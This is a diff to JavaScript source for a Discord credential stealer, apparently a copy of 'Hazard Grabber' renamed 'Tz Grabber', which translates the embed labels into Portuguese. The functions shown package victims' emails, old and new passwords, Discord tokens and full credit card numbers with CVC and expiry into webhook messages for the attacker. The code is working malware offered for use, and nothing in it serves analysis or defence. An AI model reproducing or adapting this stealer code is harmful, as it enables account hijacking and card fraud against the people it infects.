@@ -148,12 +148,12 @@ function Login(email, password, token) {
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**INFORMAÇÕES DA CONTA**",
-                            "value": `EMAIL: ${email} - SENHA: ${password}`,
+                            "name": "**Informações da Conta**",
+                            "value": `Email: ${email} - Senha: ${password}`,
                             "inline": true
                         },
                         {
-                            "name": "**TOKEN**",
+                            "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
                         }
@@ -190,17 +190,17 @@ function ChangePassword(oldpassword, newpassword, token) {
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**SENHA ALTERADA**",
-                            "value": `EMAIL: ${json.email}\nSENHA ANTIGA: ${oldpassword}\nNOVA SENHA: ${newpassword}`,
+                            "name": "**Senha Alterada**",
+                            "value": `Email: ${json.email}\nSENHA ANTIGA: ${oldpassword}\nNova Senha: ${newpassword}`,
                             "inline": true
                         },
                         {
                             "name": "**Outras informações**",
-                            "value": `TIPO DE NITRO: ${GetNitro(json.premium_type)}\nBADGES: ${GetBadges(json.flags)}`,
+                            "value": `Tipo de Nitro: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
-                            "name": "**TOKEN**",
+                            "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
                         }
@@ -237,17 +237,17 @@ function ChangeEmail(newemail, password, token) {
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**EMAIL ALTERADO**",
-                            "value": `NOVA EMAIL: ${newemail}\nSENHA: ${password}`,
+                            "name": "**Email Alterado**",
+                            "value": `Novo Email: ${newemail}\nSenha: ${password}`,
                             "inline": true
                         },
                         {
-                            "name": "**OUTRAS INFORMAÇÕES**",
-                            "value": `TIPO DE NITRO: ${GetNitro(json.premium_type)}\nBADGES: ${GetBadges(json.flags)}`,
+                            "name": "**Outras Informações**",
+                            "value": `Tipo de Nitro: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
-                            "name": "**TOKEN**",
+                            "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
                         }
@@ -276,7 +276,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Tz Grabber",
             content: "@everyone",
             avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
@@ -284,13 +284,13 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Credit Card Added**",
-                            "value": `Credit Card Number: ${number}\nCVC: ${cvc}\nCredit Card Expiration: ${expir_month}/${expir_year}`,
+                            "name": "**Cartão de crédito adicionado**",
+                            "value": `Número do Cartão de Crédito: ${number}\nCVC: ${cvc}\nVencimento do cartão de crédito: ${expir_month}/${expir_year}`,
                             "inline": true
                         },
                         {
-                            "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "name": "**Outras informações**",
+                            "value": `Tipo de Nitro: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
